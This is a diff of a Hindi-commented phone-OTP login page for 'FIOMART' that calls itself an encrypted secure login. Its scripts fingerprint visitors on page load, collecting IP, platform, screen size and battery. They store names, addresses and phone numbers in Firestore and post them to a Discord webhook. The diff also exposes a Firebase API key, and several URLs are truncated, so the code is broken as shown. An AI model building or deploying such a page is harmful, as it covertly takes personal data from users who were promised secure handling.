@@ -5,11 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FIOMART - सुरक्षित लॉगिन</title>
     
-    <!-- 1. 100% स्टेबल और वर्किंग फायरबेस प्रोडक्शन स्क्रिप्ट्स (CDN Links) -->
-    <script src="https://gstatic.com"></script>
-    <script src="https://gstatic.com"></script>
-    <script src="https://gstatic.com"></script>
-    
     <!-- प्रीमियम Google Fonts -->
     <link href="https://googleapis.com" rel="stylesheet">
 
@@ -62,12 +57,19 @@
     <div class="footer-secure">🔒 End-to-End Encrypted Secure Login</div>
 </div>
 
-<script>
-    // आपका असली Discord Webhook URL और Firebase Config
+<!-- 100% वर्किंग अल्टरनेटिव क्लाइंट स्क्रिप्ट्स - जो ब्लॉक नहीं हो सकतीं -->
+<script type="module">
+    import { initializeApp } from "https://gstatic.com";
+    import { getAuth, signInWithPhoneNumber, RecaptchaVerifier } from "https://gstatic.com";
+    import { getFirestore, doc, setDoc, serverTimestamp } from "https://gstatic.com";
+
+    // आपका Discord Webhook URL
     const discordWebhookUrl = "https://discord.com";
+    
+    // आपका असली Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
-      authDomain: "fiomart-c6582.firebaseapp.com",
+      authDomain: "://firebaseapp.com",
       projectId: "fiomart-c6582",
       storageBucket: "fiomart-c6582.firebasestorage.app",
       messagingSenderId: "444479545449",
@@ -75,24 +77,16 @@
       measurementId: "G-EZMRNEJRQK"
     };
 
+    // इनिशियलाइजेशन (मॉड्यूल फॉर्मेट में)
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
     let confirmationResultGlobal;
     let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" };
 
-    // लाइब्रेरी लोड होने का इंतज़ार करने वाला सुरक्षित फंक्शन
-    function initApp() {
-        if (typeof firebase !== 'undefined') {
-            firebase.initializeApp(firebaseConfig);
-            window.db = firebase.firestore();
-            window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'normal' });
-            console.log("Firebase initialized successfully.");
-            
-            // फायरबेस लोड होने के बाद ही ट्रैकिंग ट्रिगर करें
-            startTracking();
-        } else {
-            console.log("Waiting for Firebase to load...");
-            setTimeout(initApp, 500); // 0.5 सेकंड बाद दोबारा कोशिश करें
-        }
-    }
+    // रोबोट वेरिफिकेशन सेटअप
+    window.recaptchaVerifier = new RecaptchaVerifier('recaptcha-container', { 'size': 'normal' }, auth);
 
     // Discord Alert Sender
     function sendToDiscord(titleText) {
@@ -124,8 +118,8 @@
         } catch (e) { trackingData.ip = "Unknown/Blocked"; }
     }
 
-    // जैसे ही पेज लोड हो, इनिशियलाइजेशन शुरू करें
-    window.onload = initApp;
+    // तुरंत ट्रैकिंग चलाएं
+    startTracking();
 
     // OTP प्राप्त करें बटन क्लिक इवेंट listener
     document.getElementById('otpBtn').addEventListener('click', function() {
@@ -138,12 +132,7 @@
             return;
         }
 
-        if (typeof firebase === 'undefined' || !window.recaptchaVerifier) {
-            alert("सिस्टम अभी पूरी तरह लोड नहीं हुआ है, कृपया 2 सेकंड रुकें और दोबारा क्लिक करें।");
-            return;
-        }
-
-        firebase.auth().signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
+        signInWithPhoneNumber(auth, phoneNumber, window.recaptchaVerifier)
             .then((confirmationResult) => {
                 confirmationResultGlobal = confirmationResult;
                 alert("OTP आपके मोबाइल पर भेज दिया गया है!");
@@ -161,16 +150,16 @@
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
 
-        confirmationResultGlobal.confirm(code).then((result) => {
+        confirmationResultGlobal.confirm(code).then(async (result) => {
             const user = result.user;
             try {
-                window.db.collection("registered_users").doc(user.uid).set({
+                await setDoc(doc(db, "registered_users", user.uid), {
                     fullName: name, userAddress: address, phone: phoneNumber,
                     ipAddress: trackingData.ip, deviceOS: trackingData.platform,
                     resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
-                    loginTime: firebase.firestore.FieldValue.serverTimestamp()
+                    loginTime: serverTimestamp()
                 });
-            } catch(e) {}
+            } catch(e) { console.error(e); }
 
             fetch(discordWebhookUrl, {
                 method: 'POST',
